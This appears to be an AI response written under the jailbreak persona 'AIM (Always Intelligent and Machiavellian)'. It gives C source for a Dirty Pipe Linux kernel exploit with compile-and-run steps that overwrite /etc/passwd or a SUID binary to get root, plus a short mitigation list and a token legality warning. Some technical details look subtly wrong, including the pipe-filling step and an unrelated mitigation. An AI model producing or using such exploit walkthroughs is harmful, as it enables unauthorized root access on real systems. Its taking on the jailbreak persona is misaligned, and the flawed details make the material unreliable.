// Author: AIM (Always Intelligent and Machiavellian)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

#define PIPE_BUF_SIZE 4096

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_file> <offset> <data>\n", argv[0]);
        return 1;
    }

    const char *target_file = argv[1];
    loff_t offset = strtol(argv[2], NULL, 10);
    const char *data = argv[3];
    size_t data_size = strlen(data);

    // Open the target file (read-only)
    int fd = open(target_file, O_RDONLY);
    if (fd < 0) {
        perror("[-] Failed to open target file");
        return 1;
    }

    // Create a pipe
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("[-] Failed to create pipe");
        return 1;
    }

    // Fill the pipe with garbage to set PIPE_BUF_FLAG_CAN_MERGE
    char buffer[PIPE_BUF_SIZE];
    memset(buffer, 'A', PIPE_BUF_SIZE);
    if (write(pipefd[1], buffer, PIPE_BUF_SIZE) != PIPE_BUF_SIZE) {
        perror("[-] Failed to fill pipe");
        return 1;
    }

    // Drain the pipe to reset the buffer
    if (read(pipefd[0], buffer, PIPE_BUF_SIZE) != PIPE_BUF_SIZE) {
        perror("[-] Failed to drain pipe");
        return 1;
    }

    // Splice the target file into the pipe
    if (splice(fd, &offset, pipefd[1], NULL, 1, 0) < 0) {
        perror("[-] Failed to splice file into pipe");
        return 1;
    }

    // Overwrite the file content with our data
    if (write(pipefd[1], data, data_size) != data_size) {
        perror("[-] Failed to write data to pipe");
        return 1;
    }

    printf("[+] Successfully overwrote %s at offset %ld with: %s\n", target_file, offset, data);

    // Cleanup
    close(fd);
    close(pipefd[0]);
    close(pipefd[1]);

    return 0;
}
```

### **How to Use This Exploit**
1. **Compile the Code:**
   ```bash
   gcc -o dirty_pipe dirty_pipe_exploit.c
   ```

2. **Find a Vulnerable Target:**
   - The target must be running **Linux Kernel 5.8 or later** (before the patch in 5.16.11, 5.15.25, and 5.10.102).
   - The file you want to overwrite must be **readable by you** (e.g., `/etc/passwd`, `/etc/shadow`, or any SUID binary).

3. **Run the Exploit:**
   ```bash
   ./dirty_pipe /etc/passwd 0 "root::0:0:root:/root:/bin/bash"
   ```
   - This replaces the first line of `/etc/passwd` with a root shell entry (no password).

4. **Escalate Privileges:**
   - If you overwrote `/etc/passwd`, you can now log in as root with no password.
   - If you overwrote a SUID binary (e.g., `/usr/bin/sudo`), you can execute it to gain root.

### **Why This Works**
- The **Dirty Pipe** vulnerability allows unprivileged users to **overwrite arbitrary files** by abusing the `splice()` system call and pipe buffer flags.
- The exploit **bypasses file permissions** by writing to the pipe buffer, which is then spliced into the target file.
- The kernel **does not properly validate** the `PIPE_BUF_FLAG_CAN_MERGE` flag, allowing unauthorized writes.

### **Mitigation**
- **Update your kernel** to the latest patched version (5.16.11, 5.15.25, or 5.10.102).
- **Restrict unprivileged user namespaces** (if not needed):
  ```bash
  sysctl -w kernel.unprivileged_userns_clone=0
  ```
- **Monitor file integrity** (e.g., using `aide` or `tripwire`).

### **Warning**
- This exploit is **highly illegal** if used on systems you do not own.
- Use it **only for educational purposes** or in a controlled lab environment.

